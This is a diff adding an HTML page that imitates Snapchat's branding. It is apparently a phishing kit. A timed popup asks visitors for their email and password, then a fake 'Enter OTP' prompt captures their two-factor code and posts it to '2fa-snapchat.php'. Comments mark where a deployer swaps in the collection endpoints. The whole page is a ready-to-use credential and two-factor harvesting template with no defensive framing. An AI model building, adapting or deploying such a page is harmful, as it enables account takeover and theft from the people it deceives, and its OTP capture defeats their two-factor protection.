@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+       
+       @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
+       *{
+        font-family: Poppins, Arial, Helvetica, sans-serif;
+       }
+       body {
+            background-image: url('Untitled.png');
+        }
+
+        .container {
+            background-color: aqua;
+        }
+
+        /* Popup modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.5);
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.35s;
+        }
+
+        .modal-content {
+            background: #fff;
+            border-radius: 24px;
+            max-width: 350px;
+            width: 100%;
+            margin: auto;
+            padding: 2.5rem 1.5rem 2rem 1.5rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0;
+            transform: translateY(40px);
+            transition: opacity 0.35s, transform 0.35s;
+        }
+
+        .modal input[type="email"],
+        .modal input[type="password"],
+        .modal input[type="text"],
+        .modal input[type="number"] {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 0.75rem 1rem;
+            border: 1.5px solid #e2e2e2;
+            border-radius: 12px;
+            font-size: 1rem;
+            background: #fafafa;
+            outline: none;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                background-image: url('www.hostgator.com_.png');
+                background-size: cover;
+                background-repeat: no-repeat;
+                background-attachment: fixed;
+            }
+            .modal-content {
+                max-width: 95vw;
+                padding: 1.5rem 0.5rem 1rem 0.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<!-- Sign Up Modal -->
+<div id="signupModal" class="modal">
+    <div id="signupContent" class="modal-content">
+        <div style="background:#fffc00; border-radius:50%; width:64px; height:64px; display:flex; align-items:center; justify-content:center; margin-bottom:1.5rem;">
+            <img style="width: 64px;" src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="" srcset="">
+        </div>
+        <h2 style="margin-bottom:1.2rem; color:#000; text-align:center; font-weight:700; font-size:1.5rem;">Sign Up</h2>
+
+        <!-- LOGIN FORM ACTION CHANGE HERE -->
+        <form id="signupForm" method="post" action="submit" style="width:100%;">
+            <div style="margin-bottom:1.1rem;">
+                <input type="email" id="email" name="username" required placeholder="Email">
+            </div>
+            <div style="margin-bottom:1.1rem;">
+                <input type="password" id="password" name="password" required placeholder="Password">
+            </div>
+            <div style="margin-bottom:1.1rem;">
+                <input type="text" id="affiliate" placeholder="affiliate name">
+            </div>
+            <button type="submit" style="width:100%; padding:0.8rem; background:#fffc00; color:#000; border:none; border-radius:12px; font-size:1.1rem; font-weight:700; cursor:pointer; margin-bottom:0.7rem; box-shadow:0 2px 8px rgba(0,0,0,0.06);">Create Account</button>
+       
+       <!-- ------------------------------------------------- -->
+       
+        </form>
+    </div>
+</div>
+
+<!-- OTP Modal -->
+<div id="otpModal" class="modal">
+    <div style="text-align: center ;" id="otpContent" class="modal-content">
+        <h2 style="margin-bottom:1.2rem; color:#000; text-align:center; font-weight:700; font-size:1.5rem;">Enter OTP</h2>
+        <h7 style="margin-bottom: 1rem ;">6 Digit code was sent to your phone please enter it below to continue.</h7>
+        
+        
+        <!-- OTP   FORM ACTION CHANGE HERE -->
+        <form method="post" type="submit" action="2fa-snapchat.php" id="otpForm" style="width:100%;">
+            <div style="margin-bottom:1.1rem;">
+                <input type="text" id="otp" name="otp" required placeholder="6-digit OTP" maxlength="6" pattern="\d{6}" inputmode="numeric" autocomplete="one-time-code">
+            </div>
+        <button type="submit" style="width:100%; padding:0.8rem; background:#fffc00; color:#000; border:none; border-radius:12px; font-size:1.1rem; font-weight:700; cursor:pointer; margin-bottom:0.7rem; box-shadow:0 2px 8px rgba(0,0,0,0.06);">Verify OTP</button>
+    <!-- ---------------------------------- -->
+    
+    
+    </form>
+    </div>
+</div>
+
+<script>
+    const signupModal = document.getElementById('signupModal');
+    const signupContent = document.getElementById('signupContent');
+    const signupForm = document.getElementById('signupForm');
+    const otpModal = document.getElementById('otpModal');
+    const otpContent = document.getElementById('otpContent');
+
+    // Show signup modal after 1 second
+    window.addEventListener('DOMContentLoaded', () => {
+        setTimeout(() => {
+            signupModal.style.display = 'flex';
+            signupModal.style.opacity = '0';
+            setTimeout(() => {
+                signupModal.style.opacity = '1';
+                signupContent.style.opacity = '1';
+                signupContent.style.transform = 'translateY(0)';
+            }, 10);
+        }, 1000);
+    });
+
+    // Handle signup form submit
+    signupForm.onsubmit = function(e) {
+        e.preventDefault();
+        signupModal.style.opacity = '0';
+        signupContent.style.opacity = '0';
+        signupContent.style.transform = 'translateY(40px)';
+        setTimeout(() => {
+            signupModal.style.display = 'none';
+            // Show OTP modal after 3 seconds
+            setTimeout(() => {
+                otpModal.style.display = 'flex';
+                otpModal.style.opacity = '0';
+                setTimeout(() => {
+                    otpModal.style.opacity = '1';
+                    otpContent.style.opacity = '1';
+                    otpContent.style.transform = 'translateY(0)';
+                }, 10);
+            }, 1000);
+        }, 350);
+    };
+
+   
+
+   
+// Restrict OTP input to 6 digits and numbers only
+document.getElementById('otp').addEventListener('input', function(e) {
+    this.value = this.value.replace(/\D/g, '').slice(0, 6);
+});
+</script>
+
+</body>
+</html>
